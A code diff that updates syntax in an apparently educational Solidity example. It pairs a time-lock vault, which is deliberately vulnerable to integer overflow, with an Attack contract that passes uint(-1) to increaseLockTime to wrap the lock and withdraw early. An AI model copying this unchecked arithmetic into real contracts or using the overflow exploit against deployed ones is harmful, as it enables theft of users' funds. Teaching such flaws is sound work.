@@ -1,4 +1,5 @@
-pragma solidity ^0.6.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.10;
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -35,7 +36,7 @@ contract TimeLock {
         uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
-        (bool sent, ) = msg.sender.call.value(amount)("");
+        (bool sent, ) = msg.sender.call{value: amount}("");
         require(sent, "Failed to send Ether");
     }
 }
@@ -50,7 +51,7 @@ contract Attack {
     fallback() external payable {}
 
     function attack() public payable {
-        timeLock.deposit.value(msg.value)();
+        timeLock.deposit{value: msg.value}();
         timeLock.increaseLockTime(
             uint(-1) - timeLock.lockTime(address(this)) + 1
         );
